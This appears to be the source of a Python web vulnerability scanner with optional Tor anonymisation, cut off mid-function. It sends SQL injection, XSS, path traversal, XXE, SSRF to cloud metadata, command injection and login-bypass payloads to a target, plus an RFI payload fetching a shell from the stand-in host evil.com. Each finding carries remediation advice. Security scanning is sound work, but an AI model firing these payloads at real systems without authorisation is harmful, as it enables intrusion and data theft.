import requests
import urllib3
import socket
import ssl
import json
import re
import time
import subprocess
import sys
import warnings
import threading
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin, quote, unquote
from datetime import datetime
from typing import List, Dict, Tuple, Optional
import ipaddress
import base64
import hashlib
import os
from pyfiglet import Figlet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore')

class TorManager:
    def __init__(self):
        self.tor_enabled = False
        self.tor_process = None
        self.tor_proxy = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
    
    def start_tor(self):
        try:
            self.log_progress("Starting Tor service...")
            try:
                test_session = requests.Session()
                test_session.proxies = self.tor_proxy
                response = test_session.get('http://check.torproject.org/', timeout=10)
                if 'Congratulations' in response.text:
                    self.tor_enabled = True
                    self.log_progress("Tor is already running and connected!")
                    return True
            except:
                pass
            
            commands = [
                ['tor'],
                ['service', 'tor', 'start'],
                ['systemctl', 'start', 'tor'],
                ['/etc/init.d/tor', 'start']
            ]
            
            for cmd in commands:
                try:
                    self.tor_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    time.sleep(5)
                    
                    test_session = requests.Session()
                    test_session.proxies = self.tor_proxy
                    response = test_session.get('http://check.torproject.org/', timeout=10)
                    
                    if 'Congratulations' in response.text:
                        self.tor_enabled = True
                        self.log_progress("Tor started successfully! You are now anonymous.")
                        return True
                except:
                    continue
            
            self.log_progress("Failed to start Tor. Continuing without anonymity.")
            return False
            
        except Exception as e:
            self.log_progress(f"Tor error: {str(e)}")
            return False
    
    def stop_tor(self):
        if self.tor_process:
            try:
                self.tor_process.terminate()
                self.tor_process.wait()
                self.tor_enabled = False
                self.log_progress("Tor service stopped.")
            except:
                pass
    
    def log_progress(self, message: str):
        print(f"[TOR] {message}")

class VulnerabilityReport:
    def __init__(self):
        self.vulnerabilities = []
        self.info = []
        self.start_time = datetime.now()
        self.raw_logs = []
    
    def add_vulnerability(self, severity: str, vuln_type: str, description: str, evidence: str = "", remediation: str = "", raw_data: str = ""):
        self.vulnerabilities.append({
            'severity': severity,
            'type': vuln_type,
            'description': description,
            'evidence': evidence,
            'remediation': remediation,
            'raw_data': raw_data,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_info(self, info_type: str, data: dict):
        self.info.append({
            'type': info_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })
    
    def add_raw_log(self, log_type: str, data: str):
        self.raw_logs.append({
            'type': log_type,
            'data': data,
            'timestamp': datetime.now().isoformat()
        })

class DeepSweepWebVulnScanner:
    def __init__(self, target_url: str, report: VulnerabilityReport, progress_callback=None, use_tor=False):
        self.target_url = target_url.rstrip('/')
        self.report = report
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        self.timeout = 10
        self.progress_callback = progress_callback
        
        self.tor_manager = TorManager() if use_tor else None
        if use_tor and self.tor_manager and self.tor_manager.tor_enabled:
            self.session.proxies = self.tor_manager.tor_proxy
    
    def log_progress(self, message: str):
        if self.progress_callback:
            self.progress_callback(message)
    
    def log_raw(self, log_type: str, data: str):
        self.report.add_raw_log(log_type, data)
    
    def scan_all(self):
        checks = [
            ("SSL/TLS Configuration", self.check_ssl_tls),
            ("Security Headers", self.check_security_headers),
            ("CORS Misconfiguration", self.check_cors_misconfiguration),
            ("SQL Injection", self.check_sql_injection),
            ("XSS (Cross-Site Scripting)", self.check_xss),
            ("Directory Traversal", self.check_directory_traversal),
            ("LFI/RFI (File Inclusion)", self.check_file_inclusion),
            ("Command Injection", self.check_command_injection),
            ("SSRF", self.check_ssrf),
            ("XXE", self.check_xxe),
            ("IDOR", self.check_idor),
            ("Open Redirect", self.check_open_redirect),
            ("Authentication Bypass", self.check_auth_bypass),
            ("Session Fixation", self.check_session_fixation),
            ("Insecure Deserialization", self.check_deserialization),
            ("HTTP Verb Tampering", self.check_http_verbs),
            ("CRLF Injection", self.check_crlf_injection),
            ("Host Header Injection", self.check_host_header),
            ("Clickjacking", self.check_clickjacking),
            ("Information Disclosure", self.check_info_disclosure),
        ]
        
        total = len(checks)
        for idx, (name, check_func) in enumerate(checks, 1):
            self.log_progress(f"Scanning [{idx}/{total}]: {name}")
            try:
                check_func()
            except Exception as e:
                self.log_progress(f"Error in {name}: {str(e)}")
    
    def check_ssl_tls(self):
        try:
            parsed = urlparse(self.target_url)
            hostname = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                with socket.create_connection((hostname, port), timeout=self.timeout) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        protocol = ssock.version()
                        
                        issuer = 'Unknown'
                        expiry = 'Unknown'
                        if cert:
                            try:
                                issuer_dict = {key: value for key, value in cert.get('issuer', [[]])[0]} if cert.get('issuer') else {}
                                issuer = issuer_dict.get('organizationName', 'Unknown')
                                expiry = cert.get('notAfter', 'Unknown')
                            except:
                                pass
                        
                        cipher_name = cipher[0] if cipher else 'Unknown'
                        cipher_bits = cipher[2] if cipher and len(cipher) > 2 else 0
                        
                        ssl_info = f"""
SSL/TLS Analysis Results:
├── Protocol: {protocol}
├── Cipher Suite: {cipher_name} ({cipher_bits} bits)
├── Certificate Issuer: {issuer}
└── Certificate Expiry: {expiry}
"""
                        self.log_raw("SSL/TLS Analysis", ssl_info)
                        
                        self.report.add_info('SSL/TLS Info', {
                            'Protocol': protocol or 'Unknown',
                            'Cipher': f"{cipher_name} ({cipher_bits} bits)",
                            'Certificate Issuer': issuer,
                            'Certificate Expiry': expiry
                        })
                        
                        if protocol and ('TLSv1.0' in protocol or 'TLSv1.1' in protocol or 'SSLv' in protocol):
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Affected Protocol: {protocol}
├── Risk: Allows downgrade attacks
├── Attack Vector: Man-in-the-middle
└── Impact: Data interception and decryption
"""
                            self.report.add_vulnerability(
                                'HIGH',
                                'Weak SSL/TLS Protocol',
                                f'Server supports outdated protocol: {protocol}',
                                f'Protocol: {protocol}',
                                'Disable SSLv3, TLSv1.0, and TLSv1.1. Use TLSv1.2 or TLSv1.3 only.',
                                vuln_details
                            )
                        
                        weak_ciphers = ['RC4', 'DES', 'MD5', 'NULL', 'EXPORT', 'anon']
                        if cipher_name and any(weak in cipher_name for weak in weak_ciphers):
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Weak Cipher: {cipher_name}
├── Key Strength: {cipher_bits} bits
├── Attack Vector: Cryptographic attack
└── Impact: Encryption compromise
"""
                            self.report.add_vulnerability(
                                'HIGH',
                                'Weak Cipher Suite',
                                f'Server uses weak cipher: {cipher_name}',
                                f'Cipher: {cipher_name}',
                                'Configure server to use strong cipher suites only (AES-GCM, ChaCha20-Poly1305).',
                                vuln_details
                            )
            else:
                vuln_details = """
VULNERABILITY DETAILS:
├── Service: HTTP (Unencrypted)
├── Risk: Data transmitted in cleartext
├── Attack Vector: Network sniffing
└── Impact: Credential and data theft
"""
                self.report.add_vulnerability(
                    'MEDIUM',
                    'No HTTPS',
                    'Website does not use HTTPS encryption',
                    f'URL: {self.target_url}',
                    'Implement HTTPS with a valid SSL/TLS certificate.',
                    vuln_details
                )
        except Exception as e:
            self.log_raw("SSL/TLS Error", f"SSL/TLS analysis failed: {str(e)}")
    
    def check_security_headers(self):
        try:
            response = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            headers = response.headers
            
            header_analysis = "Security Headers Analysis:\n"
            for header, value in headers.items():
                if any(sec_header in header for sec_header in ['Security', 'X-', 'Content-', 'Strict', 'Referrer']):
                    header_analysis += f"├── {header}: {value}\n"
            
            self.log_raw("Security Headers", header_analysis)
            
            security_headers = {
                'Strict-Transport-Security': ('HIGH', 'HSTS not set - allows downgrade attacks'),
                'X-Frame-Options': ('HIGH', 'Clickjacking protection not enabled'),
                'X-Content-Type-Options': ('MEDIUM', 'MIME sniffing allowed - potential XSS vector'),
                'Content-Security-Policy': ('HIGH', 'No CSP - XSS attacks easier to execute'),
                'X-XSS-Protection': ('MEDIUM', 'Legacy XSS protection not enabled'),
                'Referrer-Policy': ('LOW', 'Referrer leakage may occur'),
                'Permissions-Policy': ('LOW', 'Feature policy not configured')
            }
            
            for header, (severity, issue) in security_headers.items():
                if header not in headers:
                    vuln_details = f"""
VULNERABILITY DETAILS:
├── Missing Header: {header}
├── Risk: {issue.split(' - ')[1] if ' - ' in issue else issue}
├── Attack Vector: Various web attacks
└── Impact: Security control bypass
"""
                    self.report.add_vulnerability(
                        severity,
                        f'Missing Security Header: {header}',
                        issue,
                        f'Header "{header}" not found in response',
                        f'Add "{header}" header with appropriate policy.',
                        vuln_details
                    )
        except Exception as e:
            self.log_raw("Security Headers Error", f"Security headers check failed: {str(e)}")
    
    def check_sql_injection(self):
        error_based_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "admin' --",
            "' UNION SELECT NULL--",
            "' OR 1=1--",
            "1' ORDER BY 100--",
        ]
        
        boolean_payloads_true = ["' OR '1'='1' --", "' OR 1=1 --"]
        boolean_payloads_false = ["' OR '1'='2' --", "' OR 1=2 --"]
        
        time_based_payloads = [
            ("' AND SLEEP(5)--", 5),
            ("1' AND SLEEP(5)--", 5),
            ("1' WAITFOR DELAY '0:0:5'--", 5),
        ]
        
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"Driver.*SQL[\W_]*Server",
            r"OLE DB.*SQL Server",
            r"ODBC SQL Server Driver",
            r"Oracle error",
            r"quoted string not properly terminated",
        ]
        
        try:
            test_urls = [
                f"{self.target_url}?id=1",
                f"{self.target_url}?page=1",
                f"{self.target_url}?user=admin",
            ]
            
            sql_log = "SQL Injection Testing Log:\n"
            
            for url in test_urls:
                try:
                    baseline_response = self.session.get(url, timeout=self.timeout, verify=False)
                    baseline_size = len(baseline_response.text)
                    baseline_time = baseline_response.elapsed.total_seconds()
                    sql_log += f"├── Baseline: {url} | Size: {baseline_size} | Time: {baseline_time:.2f}s\n"
                except:
                    continue
                
                for payload in error_based_payloads:
                    test_url = f"{url}'{payload}"
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        response_time = response.elapsed.total_seconds()
                        sql_log += f"├── Testing: {payload[:30]}... | Time: {response_time:.2f}s\n"
                        
                        for pattern in error_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: Error-based SQL Injection
├── Database Error: {re.search(pattern, response.text, re.IGNORECASE).group(0)[:100]}
├── Response Time: {response_time:.2f}s
├── Attack Vector: User input manipulation
└── Impact: Database compromise, data theft
"""
                                self.report.add_vulnerability(
                                    'CRITICAL',
                                    'SQL Injection - Error-based',
                                    'SQL error-based injection detected',
                                    f'Payload: {payload}',
                                    'Use parameterized queries/prepared statements.',
                                    vuln_details
                                )
                                self.log_raw("SQL Injection", sql_log)
                                return
                    except:
                        pass
                    time.sleep(0.05)
                
                for true_payload, false_payload in zip(boolean_payloads_true, boolean_payloads_false):
                    try:
                        true_response = self.session.get(f"{url}'{true_payload}", timeout=self.timeout, verify=False)
                        false_response = self.session.get(f"{url}'{false_payload}", timeout=self.timeout, verify=False)
                        
                        true_size = len(true_response.text)
                        false_size = len(false_response.text)
                        size_diff = abs(true_size - false_size)
                        
                        sql_log += f"├── Boolean: True={true_size}, False={false_size}, Diff={size_diff}\n"
                        
                        if size_diff > 100:
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── True Payload: {true_payload}
├── False Payload: {false_payload}
├── Response Size Difference: {size_diff} bytes
├── Technique: Boolean-based blind SQLi
├── Attack Vector: Conditional responses
└── Impact: Data extraction, authentication bypass
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'SQL Injection - Boolean-based',
                                'Boolean-based blind SQL injection detected',
                                f'True: {true_payload}, False: {false_payload}',
                                'Use parameterized queries/prepared statements.',
                                vuln_details
                            )
                            self.log_raw("SQL Injection", sql_log)
                            return
                    except:
                        pass
                
                for payload, delay in time_based_payloads:
                    try:
                        start_time = time.time()
                        self.session.get(f"{url}'{payload}", timeout=self.timeout + delay + 2, verify=False)
                        actual_delay = time.time() - start_time
                        sql_log += f"├── Time-based: {payload[:30]}... | Delay: {actual_delay:.2f}s\n"
                        
                        if actual_delay >= delay:
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Expected Delay: {delay}s
├── Actual Delay: {actual_delay:.2f}s
├── Technique: Time-based blind SQLi
├── Attack Vector: Database timing attacks
└── Impact: Data extraction, server compromise
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'SQL Injection - Time-based',
                                'Time-based blind SQL injection detected',
                                f'Payload: {payload}, Delay: {delay}s',
                                'Use parameterized queries/prepared statements.',
                                vuln_details
                            )
                            self.log_raw("SQL Injection", sql_log)
                            return
                    except:
                        pass
            
            self.log_raw("SQL Injection", sql_log)
        except Exception as e:
            self.log_raw("SQL Injection Error", f"SQL injection check failed: {str(e)}")
    
    def check_xss(self):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "'\"><script>alert(1)</script>",
        ]
        
        try:
            test_urls = [
                f"{self.target_url}?q=test",
                f"{self.target_url}?search=test",
                f"{self.target_url}?name=test",
            ]
            
            xss_log = "XSS Testing Log:\n"
            
            for url in test_urls:
                for payload in xss_payloads:
                    test_url = url.replace('test', quote(payload))
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        xss_log += f"├── Testing: {payload[:30]}... | Status: {response.status_code}\n"
                        
                        if payload in response.text or payload.replace('"', "'") in response.text:
                            context_match = re.search(r'.{0,50}' + re.escape(payload.replace('"', "'")) + r'.{0,50}', response.text)
                            context = context_match.group(0) if context_match else "Context not found"
                            
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Reflection Context: {context}
├── Technique: Reflected XSS
├── Attack Vector: Malicious script injection
├── User Impact: Session hijacking, credential theft
└── Server Impact: Client-side compromise
"""
                            self.report.add_vulnerability(
                                'HIGH',
                                'Reflected XSS',
                                'User input reflected without proper encoding',
                                f'Payload: {payload}',
                                'Implement proper output encoding/escaping. Use CSP header.',
                                vuln_details
                            )
                            self.log_raw("XSS", xss_log)
                            return
                    except:
                        pass
            
            self.log_raw("XSS", xss_log)
        except Exception as e:
            self.log_raw("XSS Error", f"XSS check failed: {str(e)}")

    def check_directory_traversal(self):
        traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        unix_indicators = ['root:', 'bin:', '/bin/bash']
        windows_indicators = ['[extensions]', '[files]']
        
        try:
            test_urls = [
                f"{self.target_url}?file=test.txt",
                f"{self.target_url}?page=home",
            ]
            
            traversal_log = "Directory Traversal Testing Log:\n"
            
            for url in test_urls:
                for payload in traversal_payloads:
                    test_url = url.replace('test.txt', payload).replace('home', payload)
                    try:
                        response = self.session.get(test_url, timeout=self.timeout, verify=False)
                        traversal_log += f"├── Testing: {payload} | Status: {response.status_code}\n"
                        
                        if any(indicator in response.text for indicator in unix_indicators + windows_indicators):
                            file_content_preview = response.text[:200] + "..." if len(response.text) > 200 else response.text
                            
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: Path traversal
├── File Accessed: System file
├── Content Preview: {file_content_preview}
├── Attack Vector: File path manipulation
└── Impact: Sensitive file disclosure
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'Directory Traversal',
                                'Able to read system files via directory traversal',
                                f'Payload: {payload}',
                                'Validate and sanitize file paths. Use whitelist.',
                                vuln_details
                            )
                            self.log_raw("Directory Traversal", traversal_log)
                            return
                    except:
                        pass
            
            self.log_raw("Directory Traversal", traversal_log)
        except Exception as e:
            self.log_raw("Directory Traversal Error", f"Directory traversal check failed: {str(e)}")

    def check_file_inclusion(self):
        lfi_payloads = [
            "/etc/passwd",
            "....//....//etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://input",
        ]
        
        rfi_payloads = [
            "http://evil.com/shell.txt",
            "//evil.com/shell.txt",
        ]
        
        try:
            test_urls = [f"{self.target_url}?file=index.php", f"{self.target_url}?page=home"]
            
            inclusion_log = "File Inclusion Testing Log:\n"
            
            for url in test_urls:
                for payload in lfi_payloads:
                    try:
                        response = self.session.get(url.replace('index.php', payload).replace('home', payload), timeout=self.timeout, verify=False)
                        inclusion_log += f"├── LFI Testing: {payload} | Status: {response.status_code}\n"
                        
                        if 'root:' in response.text or 'PD9waHA' in response.text:
                            content_indicator = 'root:' if 'root:' in response.text else 'base64 encoded content'
                            
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: Local File Inclusion
├── Evidence: {content_indicator}
├── Attack Vector: File path manipulation
└── Impact: Source code disclosure, sensitive data exposure
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'Local File Inclusion (LFI)',
                                'Able to include local files',
                                f'Payload: {payload}',
                                'Never use user input in file inclusion. Use whitelist.',
                                vuln_details
                            )
                            self.log_raw("File Inclusion", inclusion_log)
                            return
                    except:
                        pass
                
                for payload in rfi_payloads:
                    try:
                        response = self.session.get(url.replace('index.php', quote(payload)).replace('home', quote(payload)), timeout=self.timeout, verify=False)
                        inclusion_log += f"├── RFI Testing: {payload} | Status: {response.status_code}\n"
                        
                        if response.status_code == 200 and len(response.text) > 0:
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: Remote File Inclusion
├── Evidence: External resource loaded
├── Attack Vector: Remote file execution
└── Impact: Remote code execution, server compromise
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'Remote File Inclusion (RFI)',
                                'Able to include remote files',
                                f'Payload: {payload}',
                                'Disable remote file inclusion. Validate input.',
                                vuln_details
                            )
                            self.log_raw("File Inclusion", inclusion_log)
                            return
                    except:
                        pass
            
            self.log_raw("File Inclusion", inclusion_log)
        except Exception as e:
            self.log_raw("File Inclusion Error", f"File inclusion check failed: {str(e)}")

    def check_command_injection(self):
        cmd_payloads = [
            "; ls",
            "| ls",
            "& dir",
            "; whoami",
            "| id",
            "`whoami`",
            "$(whoami)",
        ]
        
        try:
            test_urls = [f"{self.target_url}?cmd=ping", f"{self.target_url}?exec=test"]
            
            cmd_log = "Command Injection Testing Log:\n"
            
            for url in test_urls:
                for payload in cmd_payloads:
                    try:
                        response = self.session.get(f"{url}{quote(payload)}", timeout=self.timeout, verify=False)
                        cmd_log += f"├── Testing: {payload} | Status: {response.status_code}\n"
                        
                        if any(ind in response.text for ind in ['uid=', 'gid=', 'root:', 'drwxr']):
                            command_output = ""
                            for line in response.text.split('\n'):
                                if any(ind in line for ind in ['uid=', 'gid=', 'root:', 'drwxr']):
                                    command_output = line[:100]
                                    break
                            
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: OS command injection
├── Command Output: {command_output}
├── Attack Vector: System command execution
└── Impact: Full server compromise
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'Command Injection',
                                'Arbitrary command execution detected',
                                f'Payload: {payload}',
                                'Never pass user input to system commands.',
                                vuln_details
                            )
                            self.log_raw("Command Injection", cmd_log)
                            return
                    except:
                        pass
            
            self.log_raw("Command Injection", cmd_log)
        except Exception as e:
            self.log_raw("Command Injection Error", f"Command injection check failed: {str(e)}")

    def check_ssrf(self):
        ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        
        try:
            test_urls = [f"{self.target_url}?url=http://example.com", f"{self.target_url}?fetch=http://example.com"]
            
            ssrf_log = "SSRF Testing Log:\n"
            
            for url in test_urls:
                for payload in ssrf_payloads:
                    try:
                        response = self.session.get(url.replace('http://example.com', quote(payload)), timeout=self.timeout, verify=False)
                        ssrf_log += f"├── Testing: {payload} | Status: {response.status_code}\n"
                        
                        if any(ind in response.text for ind in ['ami-id', 'instance-id', 'local-hostname']):
                            internal_data = ""
                            for line in response.text.split('\n'):
                                if any(ind in line for ind in ['ami-id', 'instance-id', 'local-hostname']):
                                    internal_data = line.strip()
                                    break
                            
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Technique: Server-Side Request Forgery
├── Internal Data: {internal_data}
├── Attack Vector: Internal service access
└── Impact: Internal network enumeration, metadata exposure
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'Server-Side Request Forgery (SSRF)',
                                'Server making requests to internal resources',
                                f'Payload: {payload}',
                                'Validate and whitelist URLs. Block internal IPs.',
                                vuln_details
                            )
                            self.log_raw("SSRF", ssrf_log)
                            return
                    except:
                        pass
            
            self.log_raw("SSRF", ssrf_log)
        except Exception as e:
            self.log_raw("SSRF Error", f"SSRF check failed: {str(e)}")

    def check_cors_misconfiguration(self):
        try:
            test_origins = [
                'https://evil.com',
                'null',
                self.target_url.replace('https://', 'https://attacker.'),
            ]
            
            cors_log = "CORS Testing Log:\n"
            
            for origin in test_origins:
                headers = {'Origin': origin}
                response = self.session.get(self.target_url, headers=headers, timeout=self.timeout, verify=False)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                cors_log += f"├── Origin: {origin} | ACAO: {acao} | ACAC: {acac}\n"
                
                if acao == '*' and acac == 'true':
                    vuln_details = f"""
VULNERABILITY DETAILS:
├── Origin: {origin}
├── Access-Control-Allow-Origin: *
├── Access-Control-Allow-Credentials: true
├── Technique: CORS misconfiguration
├── Attack Vector: Cross-origin requests with credentials
└── Impact: Credential theft, CSRF attacks
"""
                    self.report.add_vulnerability(
                        'CRITICAL',
                        'CORS Misconfiguration - Credential Leak',
                        'CORS allows all origins with credentials enabled',
                        f'Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acac}',
                        'Never use Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true',
                        vuln_details
                    )
                    self.log_raw("CORS", cors_log)
                    return
                elif acao == origin or acao == 'null':
                    vuln_details = f"""
VULNERABILITY DETAILS:
├── Origin: {origin}
├── Access-Control-Allow-Origin: {acao}
├── Technique: CORS origin reflection
├── Attack Vector: Arbitrary origin acceptance
└── Impact: Cross-origin data access
"""
                    self.report.add_vulnerability(
                        'HIGH',
                        'CORS Misconfiguration - Origin Reflection',
                        f'Server reflects untrusted origin: {origin}',
                        f'Origin {origin} is reflected in Access-Control-Allow-Origin',
                        'Implement a strict whitelist of allowed origins.',
                        vuln_details
                    )
                    self.log_raw("CORS", cors_log)
                    return
            
            self.log_raw("CORS", cors_log)
        except Exception as e:
            self.log_raw("CORS Error", f"CORS check failed: {str(e)}")

    def check_xxe(self):
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>'''
        
        try:
            response = self.session.post(
                self.target_url,
                data=xxe_payload,
                headers={'Content-Type': 'application/xml'},
                timeout=self.timeout,
                verify=False
            )
            
            xxe_log = f"XXE Testing Log:\n├── Payload Sent: {xxe_payload[:100]}...\n├── Response Status: {response.status_code}\n"
            
            if 'root:' in response.text or 'bin:' in response.text:
                file_content = ""
                for line in response.text.split('\n'):
                    if 'root:' in line or 'bin:' in line:
                        file_content = line[:100]
                        break
                
                vuln_details = f"""
VULNERABILITY DETAILS:
├── Technique: XML External Entity
├── File Accessed: /etc/passwd
├── Content: {file_content}
├── Attack Vector: XML parser exploitation
└── Impact: File disclosure, SSRF, DoS
"""
                self.report.add_vulnerability(
                    'CRITICAL',
                    'XML External Entity (XXE)',
                    'XML parser allows external entity processing',
                    'File content disclosed via XXE',
                    'Disable external entity processing in XML parsers.',
                    vuln_details
                )
            
            self.log_raw("XXE", xxe_log)
        except Exception as e:
            self.log_raw("XXE Error", f"XXE check failed: {str(e)}")

    def check_idor(self):
        try:
            test_patterns = [
                (f"{self.target_url}?id=1", f"{self.target_url}?id=2"),
                (f"{self.target_url}/user/1", f"{self.target_url}/user/2"),
            ]
            
            idor_log = "IDOR Testing Log:\n"
            
            for url1, url2 in test_patterns:
                try:
                    resp1 = self.session.get(url1, timeout=self.timeout, verify=False)
                    resp2 = self.session.get(url2, timeout=self.timeout, verify=False)
                    
                    idor_log += f"├── URL1: {url1} | Status: {resp1.status_code}\n"
                    idor_log += f"├── URL2: {url2} | Status: {resp2.status_code}\n"
                    
                    if resp1.status_code == 200 and resp2.status_code == 200 and resp1.text != resp2.text and len(resp1.text) > 100:
                        content_diff = "Different content returned for sequential IDs"
                        
                        vuln_details = f"""
VULNERABILITY DETAILS:
├── URL1: {url1}
├── URL2: {url2}
├── Technique: Insecure Direct Object Reference
├── Evidence: {content_diff}
├── Attack Vector: ID enumeration
└── Impact: Unauthorized data access
"""
                        self.report.add_vulnerability(
                            'MEDIUM',
                            'Possible IDOR',
                            'Sequential IDs accessible without authorization checks',
                            f'URLs: {url1}, {url2}',
                            'Implement proper authorization. Use non-sequential IDs.',
                            vuln_details
                        )
                        self.log_raw("IDOR", idor_log)
                        return
                except:
                    pass
            
            self.log_raw("IDOR", idor_log)
        except Exception as e:
            self.log_raw("IDOR Error", f"IDOR check failed: {str(e)}")

    def check_open_redirect(self):
        redirect_payloads = [
            "//evil.com",
            "https://evil.com",
            "//google.com",
        ]
        
        try:
            test_urls = [f"{self.target_url}?redirect=", f"{self.target_url}?url=", f"{self.target_url}?next="]
            
            redirect_log = "Open Redirect Testing Log:\n"
            
            for url in test_urls:
                for payload in redirect_payloads:
                    try:
                        response = self.session.get(f"{url}{quote(payload)}", timeout=self.timeout, verify=False, allow_redirects=False)
                        location = response.headers.get('Location', '')
                        redirect_log += f"├── Payload: {payload} | Location: {location}\n"
                        
                        if 'evil.com' in location or 'google.com' in location:
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Payload: {payload}
├── Redirect Location: {location}
├── Technique: Open redirect
├── Attack Vector: URL manipulation
└── Impact: Phishing attacks, trust abuse
"""
                            self.report.add_vulnerability(
                                'MEDIUM',
                                'Open Redirect',
                                'Application redirects to untrusted URLs',
                                f'Payload: {payload}, Location: {location}',
                                'Validate redirect URLs against whitelist.',
                                vuln_details
                            )
                            self.log_raw("Open Redirect", redirect_log)
                            return
                    except:
                        pass
            
            self.log_raw("Open Redirect", redirect_log)
        except Exception as e:
            self.log_raw("Open Redirect Error", f"Open redirect check failed: {str(e)}")

    def check_auth_bypass(self):
        bypass_payloads = [
            {'username': "admin' --", 'password': 'anything'},
            {'username': "admin' OR '1'='1", 'password': 'anything'},
            {'username': "admin", 'password': "' OR '1'='1"},
        ]
        
        try:
            login_paths = ['/login', '/admin/login', '/auth']
            
            auth_log = "Authentication Bypass Testing Log:\n"
            
            for path in login_paths:
                url = urljoin(self.target_url, path)
                for payload in bypass_payloads:
                    try:
                        response = self.session.post(url, data=payload, timeout=self.timeout, verify=False)
                        auth_log += f"├── Path: {path} | Payload: {payload} | Status: {response.status_code}\n"
                        
                        if any(keyword in response.text.lower() for keyword in ['welcome', 'dashboard', 'logout', 'profile']):
                            vuln_details = f"""
VULNERABILITY DETAILS:
├── Path: {path}
├── Payload: {payload}
├── Technique: SQL injection in authentication
├── Attack Vector: Credential bypass
└── Impact: Unauthorized access, privilege escalation
"""
                            self.report.add_vulnerability(
                                'CRITICAL',
                                'Authentication Bypass',
                                'Able to bypass authentication',
                                f'Payload: {payload}',
                                'Implement proper authentication validation.',
                                vuln_details
                            )
                            self.log_raw("Auth Bypass", auth_log)
                            return
                    except:
                        pass
            
            self.log_raw("Auth Bypass", auth_log)
        except Exception as e:
            self.log_raw("Auth Bypass Error", f"Auth bypass check failed: {str(e)}")

    def check_session_fixation(self):
        try:
            response1 = self.session.get(self.target_url, timeout=self.timeout, verify=False)
            cookie1 = response1.cookies.get('PHPSESSID') or response1.cookies.get('JSESSIONID') or response1.cookies.get('sessionid')
            
            session_log = f"Session Fixation Testing Log:\n├── Initial Cookie: {cookie1}\n"
            
            if cookie1:
                self.session.cookies.set('PHPSESSID', cookie1)
                response2 = self.session.get(self.target_url, timeout=self.timeout, verify=False)
                cookie2 = response2.cookies.get('PHPSESSID')
                
                session_log += f"├── Post-Auth Cookie: {cookie2}\n"
                
                if cookie1 == cookie2:
                    vuln_details = f"""
VULNERABILITY DETAILS:
├── Session Cookie: {cookie1}
├── Technique: Session fixation
├── Evidence: Session ID unchanged after authentication
├── Attack Vector: Session hijacking
└── Impact: Account takeover
"""
                    self.report.add_vulnerability(
                        'MEDIUM',
                        'Session Fixation',
                        'Session ID not regenerated after login',
                        f'Session cookie: {cookie1}',
                        'Regenerate session ID after authentication.',
                        vuln_details
                    )
            
            self.log_raw("Session Fixation", session_log)
        except Exception as e:
            self.log_raw("Session Fixation Error", f"Session fixation check failed: {str(e)}")

    def check_deserialization(self):
        deser_payloads = [
            'O:8:"stdClass":0:{}',
            'a:1:{i:0;O:8:"stdClass":0:{}}',
            base64.b64encode(b'O:8:"stdClass":0:{}').decode(),
        ]
        
        try:
            deser_log = "Deserialization Testing Log:\n"
